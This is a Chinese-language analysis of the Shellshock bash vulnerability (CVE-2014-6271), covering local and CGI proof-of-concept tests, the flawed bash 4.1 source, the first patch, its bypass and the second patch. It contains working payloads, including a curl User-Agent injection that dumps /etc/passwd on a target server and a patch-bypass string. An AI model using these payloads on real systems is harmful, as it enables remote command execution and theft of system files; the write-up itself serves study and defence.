#CVE-2014-6271分析

##漏洞验证
####本地命令行 
bash输入:  
`env x='() { :;}; echo vulnerable' bash -c "echo this is CVE-2014-6271"`   

    [shellshock] env x='() { :;}; echo vulnerable' bash -c "echo this is CVE-2014-6271"

输出：

    vulnerable
    this is CVE-2014-6271

输出了`vulnerable`，`bash`执行了x函数体外的`echo vulnerable`  

####本地程序：
创建一个子进程调用bash来执行用例：  

代码：    

      1 #include <stdio.h>
      2 #include <unistd.h>
      3 #include <stdlib.h>
      4
      5 char *env_init[] =
      6 {
      7         "PATH=/bin:/usr/bin:/usr/local/bin",
      8         "/usr/bin/id=() { echo in function; };"
      9         "echo out of function",
     10         NULL
     11 };
     12
     13 int main()
     14 {
     15         char *argv[] ={"/bin/bash",NULL};
     16
     17         if(execve(argv[0],argv,env_init) < 0)
     18         {
     19           printf("execve error");
     20           exit(0);
     21         }
     22         return 0;
     23 }
     24

结果:  

    root@kali:/root/Desktop/sec/shellshock# gcc -o shellshock_test shellshock_test.c
    root@kali:/root/Desktop/sec/shellshock# ./shellshock_test
    out of function
    root@kali:/root/Desktop/sec/shellshock# /usr/bin/id
    in function

输出了`out of function`   
在执行` "/usr/bin/id=() { echo in function; };""echo out of function",` 时   
bash执行了`"echo out of function"`  

####远程CGI：

poc.cgi

    #!/bin/bash 
    echo "Content-type: text/html" 
    echo "" 
    echo '<html>' 
    echo '<head>' 
    echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">' 
    echo '<title>PoC</title>' 
    echo '</head>' 
    echo '<body>' 
    echo '<pre>' 
    /usr/bin/env 
    echo '</pre>' 
    echo '</body>' 
    echo '</html>' 
    exit 0

测试：  
目标服务器上 `cgi-bin`目录下有`poc.cgi`：  
`curl -A ‘() { :; }; /bin/cat /etc/passwd > dumped_file’ http:/目标IP/poc.cgi` 

服务器收到HTTP请求后，服务器将带有`‘() { :; }; /bin/cat /etc/passwd > dumped_file’`的User-Agent设置为环境变量    

    HTTP_USER_AGENT()
    {
       :;
    };
    /bin/cat /etc/passwd > dumped_file

并调用以`#!/bin/bash`开头的`poc.cgi`脚本    
bash由于这个漏洞，执行了`/bin/cat /etc/passwd > dumped_file`  

再通过`curl http://目标IP/dumped_file `可查看文本  


##漏洞分析
源文件：   
- [bash-4.1.tar.gz](https://ftp.gnu.org/gnu/bash/bash-4.1.tar.gz)  

####bash架构

bash的处理是一种流水线的处理方法：  
首先由终端或脚本读入数据，然后使用一系列变换过程依次进行处理，执行到最后一个shell命令后返回。  
<img src=./bash.png>

图为bash处理流程

此次漏洞出现在词法分析和解析环节。  

###代码：  
在bash 4.1源码下的`builtins`目录中的`evalstring.c`文件有`int parse_and_execute (string, from_file, flags)`函数，负责解析字符串并执行命令。  
函数源码如下：    

    /* Parse and execute the commands in STRING.  Returns whatever
       execute_command () returns.  
    */
    int
    parse_and_execute (string, from_file, flags)
         char *string;
         const char *from_file;
         int flags;
    {  
        //省略...
          
          if (parse_command () == 0)
        {
          if ((flags & SEVAL_PARSEONLY) || (interactive_shell == 0 && read_but_dont_execute)) 
          //此语句没判断函数边界
            { 
              last_result = EXECUTION_SUCCESS;
              dispose_command (global_command);
              global_command = (COMMAND *)NULL;
            }
          else if (command = global_command)
            {
              //如果此语句执行，传入的函数会被当作全局函数
              //然后全局函数后面跟着的代码成功执行 
              //代码注入成功
              struct fd_bitmap *bitmap;
              bitmap = new_fd_bitmap (FD_BITMAP_SIZE);
              begin_unwind_frame ("pe_dispose");
              add_unwind_protect (dispose_fd_bitmap, bitmap);
              add_unwind_protect (dispose_command, command);    /* XXX */
              global_command = (COMMAND *)NULL;
              if ((subshell_environment & SUBSHELL_COMSUB) && comsub_ignore_return)
            
            command->flags |= CMD_IGNORE_RETURN;
           }
             //省略...
      return (last_result);
    }

调用`parse_and_execute`的`variables.c`中的函数
`void initialize_shell_variables (env, privmode)`

    void
    initialize_shell_variables (env, privmode)
         char **env;
         int privmode;
    {
      char *name, *string, *temp_string;
      int c, char_index, string_index, string_length;
      SHELL_VAR *temp_var;
      
      create_variable_tables ();
      //从ENV环境变量中获取参数
      for (string_index = 0; string = env[string_index++]; )
        {
          char_index = 0;
          name = string;
          while ((c = *string++) && c != '=');
          if (string[-1] == '=')
        char_index = string - name - 1;
          /* If there are weird things in the environment, like `=xxx' or a
         string without an `=', just skip them. */
          if (char_index == 0)
        continue;
          /* ASSERT(name[char_index] == '=') */
          name[char_index] = '\0';
          /* Now, name = env variable name, string = env variable value, and
         char_index == strlen (name) */
          temp_var = (SHELL_VAR *)NULL;
          if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4))
          //bash函数处理
        {
          string_length = strlen (string);
          temp_string = (char *)xmalloc (3 + string_length + char_index);
          strcpy (temp_string, name);
          temp_string[char_index] = ' ';
          
          //全部复制到temp_string，并没有边界检查
          strcpy (temp_string + char_index + 1, string);
          //调用parse_and_execute而且此函数里也没有边界检查
          //导致了数据和代码的混淆
          parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
          
          /* Ancient backwards compatibility.  Old versions of bash exported
             functions like name()=() {...} */
          if (name[char_index - 1] == ')' && name[char_index - 2] == '(')
            name[char_index - 2] = '\0';
          if (temp_var = find_function (name))
            {
              VSETATTR (temp_var, (att_exported|att_imported));
              array_needs_making = 1;
            }
          else
            report_error (_("error importing function definition for `%s'"), name);
          /* ( */
          if (name[char_index - 1] == ')' && name[char_index - 2] == '\0')
            name[char_index - 2] = '(';     /* ) */
        }

###第一次补丁
第一次补丁，官方在`parse_and_execute`函数中进行了类型判断，修改的内容如下:
<pre><code>
  #define SEVAL_FUNCDEF 0x080       /* only allow function definitions */
  #define SEVAL_ONECMD  0x100       /* only allow a single command */

    if ((flags & SEVAL_FUNCDEF) && command->type != cm_function_def)
    {
         //判断是不是合法的函数定义
         break;
    }
   ...

  // 逻辑为真就表明参数不合法
  if (flags & SEVAL_ONECMD)
  break;
</code></pre>
此版本补丁被bypass，下面为语句：  
`env X='() { (x)=>\' ./bash -c 'my echo hello'`

x的函数体：`'() { (x)=>\'` 中`(){`会被判断为函数，而且也是单个命令   
bash在执行的时候，会忽略`(x)=`，就剩下了`>\`    
连接起来，`>\my echo hello`会生成一个my文件，内容为hello  
同样，代码执行了。

###第二次补丁
链接：[官方文档](http://ftp.gnu.org/pub/gnu/bash/bash-4.1-patches/bash41-014)  
此次版本，修改了variables.c文件的一些代码：  
<pre><code>
//增加对函数边界，后缀的判断
#define BASHFUNC_PREFIX   "BASH_FUNC_"
#define BASHFUNC_PREFLEN  10  /* == strlen(BASHFUNC_PREFIX */
#define BASHFUNC_SUFFIX   "%%"
#define BASHFUNC_SUFFLEN  2 /* == strlen(BASHFUNC_SUFFIX) */

 if (privmode == 0 && read_but_dont_execute == 0 && 
           STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN) &&
          STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN) &&
    STREQN ("() {", string, 4))  //增加对函数边界的判断
    {
     size_t namelen;
     char *tname;    /* desired imported function name */
     namelen = char_index - BASHFUNC_PREFLEN - BASHFUNC_SUFFLEN;
     tname = name + BASHFUNC_PREFLEN;  /* start of func name */
     tname[namelen] = '\0';    /* now tname == func name */
     //省略
   }

 //增加对是不是函数的判断
 static inline char *mk_env_string (name, value, isfunc)
 const char *name, *value;int isfunc;  
</code></pre>

##参考链接
1. https://www.invisiblethreat.ca/2014/09/cve-2014-6271/
2. http://drops.wooyun.org/papers/3064
3. http://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/
4. http://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-patch-bypass-analysis/
5. http://coolshell.cn/articles/11973.html
